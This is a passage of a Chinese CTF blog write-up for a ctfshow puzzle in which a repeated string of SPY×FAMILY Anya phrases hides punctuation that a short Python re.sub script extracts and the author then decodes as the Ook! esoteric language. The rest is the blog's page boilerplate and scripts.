.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚好想看呀!哇酷哇酷?完美的劳埃德曼,好想看呀!看我必杀拳,砰!阿尼亚一点也不在意.阿尼亚棒吗?阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚可爱吗?阿尼亚想去你家玩.阿尼亚帅不帅?好耶!阿尼亚从孤儿院出来以后,遇到了好多开心的事.蓬蓬头?阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.父亲,母亲,有需要帮助的人!太好了.哇酷哇酷?母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.要帮助他!阿尼亚棒吗?太好了!花生!我想永远和他们在一起.阿尼亚可爱吗?阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚帅不帅?父亲做菜很好吃.蓬蓬头?阿尼亚好想看呀!多亏了父亲.哇酷哇酷?完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!太好了.阿尼亚棒吗?母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.阿尼亚在学校也会加油的!阿尼亚可爱吗?阿尼亚必须加油!营救公主的间谍!多亏了父亲.阿尼亚帅不帅?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.蓬蓬头?我想永远和他们在一起.哇酷哇酷?是住在城堡里的奇美拉!父亲做菜很好吃.阿尼亚棒吗?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.救命呀!太好了.阿尼亚可爱吗?母亲,给阿尼亚做特训吧.&#x27;</span><br><br>temp = re.sub(<span class="hljs-string">&#x27;[\u4e00-\u9fa5]&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, string)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;decrypt_flag.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> ff:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> temp:<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">or</span> i == <span class="hljs-string">&#x27;?&#x27;</span> <span class="hljs-keyword">or</span> i == <span class="hljs-string">&#x27;!&#x27;</span>):<br>            ff.write(i)<br><br><span class="hljs-built_in">print</span>(temp)<br><br><span class="hljs-comment"># ff.close()</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;End&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这里学到了一个新的东西 <code>re.sub()</code>，这个函数可以用来正则替换字符串中的匹配项</p>
+<p>在正则表达式中 <code>[\u4e00-\u9fa5]</code>代表<strong>中文的unicode编码范围</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">re.sub(<span class="hljs-string">&#x27;[\u4e00-\u9fa5]&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, string)<br></code></pre></td></tr></table></figure>
+
+<p>将所有中文替换为空</p>
+<p>运行脚本后，我们直接去网站解密：<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">ook</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctfshow-%E6%84%9A%E4%BA%BA%E6%9D%AF/" class="print-no-link">#ctfshow_愚人杯</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ctfshow_愚人杯</div>
+      <div>https://leekosss.github.io/2023/08/24/ctfshow_愚人杯/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年6月5日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/24/easycms/" title="easycms">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">easycms</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/24/ctfshow_%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="ctfshow_信息搜集">
+                        <span class="hidden-mobile">ctfshow_信息搜集</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
